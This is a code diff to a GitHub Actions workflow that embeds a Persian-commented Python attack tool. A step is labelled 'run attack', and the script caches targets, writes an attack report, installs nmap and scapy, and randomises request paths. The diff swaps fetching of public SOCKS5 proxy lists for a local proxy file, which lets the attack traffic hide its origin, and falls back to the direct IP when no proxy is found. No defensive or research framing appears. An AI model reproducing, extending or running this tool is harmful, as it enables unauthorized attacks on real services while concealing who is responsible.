@@ -56,7 +56,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
-          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap aiohttp_socks
+          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
 
       - name: اجرای حمله
         env:
@@ -80,7 +80,6 @@ jobs:
           CACHE_FILE = CACHE_DIR / "targets_cache.json"
           REPORT_FILE = "attack_report.txt"
           CACHE_VALID_HOURS = 24
-          PROXY_LIST_FILE = "proxy_list.txt"
 
           # ===== رویداد توقف سراسری =====
           stop_event = threading.Event()
@@ -218,48 +217,22 @@ jobs:
           ]
           def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          # ===== 1. ماژول مدیریت پروکسی =====
-          def fetch_free_proxies():
-              """دریافت و پردازش لیست پروکسی‌های رایگان"""
-              try:
-                  console.print("[cyan]⚙️ در حال دریافت لیست پروکسی‌های رایگان...[/cyan]")
-                  # دانلود لیست از مخزن TheSpeedX
-                  url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
-                  resp = requests.get(url, timeout=10)
-                  proxies = []
-                  for line in resp.text.splitlines():
-                      if ":" in line and line.count('.') == 3:
-                          proxies.append(line.strip())
-                  console.print(f"[green]🎯 {len(proxies)} پروکسی دریافت شد.[/green]")
-                  return proxies
-              except:
-                  console.print("[red]❌ خطا در دریافت پروکسی‌ها. بدون پروکسی ادامه می‌دهیم.[/red]")
-                  return []
-
-          def is_proxy_alive(proxy):
-              """بررسی زنده بودن پروکسی"""
-              try:
-                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.settimeout(3)
-                  ip = proxy.split(':')[0]
-                  port = int(proxy.split(':')[1])
-                  sock.connect((ip, port))
-                  sock.close()
-                  return True
-              except:
-                  return False
-
+          # ===== 1. ماژول پیشرفته مدیریت پروکسی =====
           PROXIES = []
           def init_proxies():
               global PROXIES
-              PROXIES = fetch_free_proxies()
-              if PROXIES:
-                  console.print("[green]✅ پروکسی‌ها با موفقیت بارگذاری شدند.[/green]")
-              else:
-                  console.print("[yellow]⚠️ هیچ پروکسی در دسترسی نیست. حمله با IP مستقیم انجام خواهد شد.[/yellow]")
+              local_file = "proxies.txt"
+              if os.path.exists(local_file):
+                  try:
+                      with open(local_file, "r") as f:
+                          PROXIES = [line.strip() for line in f if line.strip()]
+                      console.print(f"[green]✅ {len(PROXIES)} پروکسی از فایل محلی بارگذاری شد.[/green]")
+                      return
+                  except:
+                      pass
+              console.print("[yellow]⚠️ فایل پروکسی محلی یافت نشد. حمله با IP مستقیم ادامه می‌یابد.[/yellow]")
 
           def get_random_proxy():
-              """انتخاب یک پروکسی تصادفی از لیست"""
               if PROXIES:
                   return random.choice(PROXIES)
               return None
